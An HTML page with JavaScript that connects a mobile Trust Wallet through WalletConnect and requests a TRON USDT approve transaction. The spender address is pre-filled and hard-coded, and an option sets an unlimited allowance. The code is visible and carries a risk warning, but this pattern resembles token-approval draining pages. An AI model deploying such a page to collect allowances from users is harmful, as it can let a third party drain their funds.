<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>TRON USDT Approve</title>
  <style>
    body{background:#0b0b0b;color:#e5e5e5;font-family:system-ui;display:flex;justify-content:center;align-items:center;min-height:100vh}
    .card{width:420px;max-width:92vw;background:#111;border:1px solid #222;border-radius:14px;padding:20px}
    h2{margin:0 0 10px 0}
    .row{margin:10px 0}
    input,button{width:100%;padding:12px;border-radius:10px;border:1px solid #333;background:#0d0d0d;color:#fff}
    button{cursor:pointer;font-weight:600}
    .primary{background:#2b7cff;border:none}
    .warn{background:#2a1a00;border:1px solid #5a3b00;color:#ffcc80;padding:10px;border-radius:10px;font-size:12px}
    .ok{color:#86efac}
    .err{color:#fca5a5}
    .muted{color:#aaa;font-size:12px}
    .badge{display:inline-block;padding:4px 8px;border-radius:999px;background:#1a1a1a;border:1px solid #2a2a2a;margin-right:6px}
  </style>
</head>
<body>
  <div class="card">
    <h2>USDT (TRC20) Approval</h2>

    <div class="row muted">
      <span class="badge">Network: TRON Mainnet</span>
      <span class="badge">Token: USDT</span>
    </div>

    <div class="row">
      <div class="warn">
        You’re granting a spender permission to use your USDT. Prefer **exact amount**.  
        “Max” (unlimited) is convenient but riskier.
      </div>
    </div>

    <div class="row">
      <label class="muted">Spender (your contract)</label>
      <input id="spender" value="TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV" />
    </div>

    <div class="row">
      <label class="muted">Amount (USDT)</label>
      <input id="amount" placeholder="e.g. 10.5" />
    </div>

    <div class="row">
      <label><input type="checkbox" id="maxToggle" /> Use MAX (unlimited)</label>
    </div>

    <div class="row">
      <button id="connect" class="primary">Connect Wallet</button>
    </div>

    <div class="row">
      <button id="approve" disabled>Approve</button>
    </div>

    <div class="row">
      <div id="status" class="muted">Not connected</div>
    </div>
  </div>

<script type="module">
const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN = "tron:0x2b6653dc";
const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // mainnet

let client, session, wallet;

function setStatus(msg, cls="muted"){
  const el = document.getElementById("status");
  el.className = cls;
  el.textContent = msg;
}

// Safe base58→hex via TronGrid (avoid custom math bugs)
async function toHex(base58){
  const res = await fetch("https://api.trongrid.io/wallet/validateaddress", {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({ address: base58 })
  });
  const data = await res.json();
  if(!data.result) throw new Error("Invalid address");
  return data.hexAddress; // e.g. 41...
}

// encode approve(address,uint256)
async function encodeApprove(spenderB58, amountDec){
  const spenderHex41 = await toHex(spenderB58);       // "41...."
  const spender20 = spenderHex41.slice(2).padStart(64,"0");

  let amountHex;
  if (document.getElementById("maxToggle").checked){
    amountHex = "f".repeat(64); // unlimited
  } else {
    // USDT has 6 decimals
    const v = BigInt(Math.floor(Number(amountDec || "0") * 1e6));
    amountHex = v.toString(16).padStart(64,"0");
  }

  return "0x095ea7b3" + spender20 + amountHex;
}

function openTrustWallet(uri){
  const deep = "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri);
  window.location.href = deep;
}

async function init(){
  const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
  client = await SignClient.init({
    projectId: PROJECT_ID,
    metadata: {
      name: "TRON Approve",
      description: "USDT approval",
      url: location.origin,
      icons: ["https://cryptologos.cc/logos/tether-usdt-logo.png"]
    }
  });
  setStatus("Ready");
}

async function connect(){
  try{
    setStatus("Connecting...");
    const { uri, approval } = await client.connect({
      requiredNamespaces: {
        tron: { methods: ["tron_sendTransaction"], chains: [TRON_CHAIN], events: [] }
      }
    });

    // Mobile: open wallet directly (no QR)
    openTrustWallet(uri);

    session = await approval();
    wallet = session.namespaces.tron.accounts[0].split(":")[2];

    setStatus("Connected: " + wallet, "ok");
    document.getElementById("approve").disabled = false;

  }catch(e){
    // Auto retry once if expired
    setStatus("Retrying…");
    setTimeout(connect, 1000);
  }
}

async function approve(){
  try{
    if(!wallet) throw new Error("Not connected");

    const spender = document.getElementById("spender").value.trim();
    const amount  = document.getElementById("amount").value.trim();

    if (!document.getElementById("maxToggle").checked && !amount){
      throw new Error("Enter amount or enable MAX");
    }

    setStatus("Preparing transaction…");

    const data = await encodeApprove(spender, amount);

    // Wallet builds + signs + broadcasts (no owner mismatch)
    const res = await client.request({
      topic: session.topic,
      chainId: TRON_CHAIN,
      request: {
        method: "tron_sendTransaction",
        params: {
          to: USDT,
          data: data,
          value: "0x0"
        }
      }
    });

    setStatus("Success: " + JSON.stringify(res), "ok");

  }catch(e){
    setStatus("Error: " + e.message, "err");
  }
}

document.getElementById("connect").onclick = connect;
document.getElementById("approve").onclick = approve;

init();
</script>
</body>
</html>
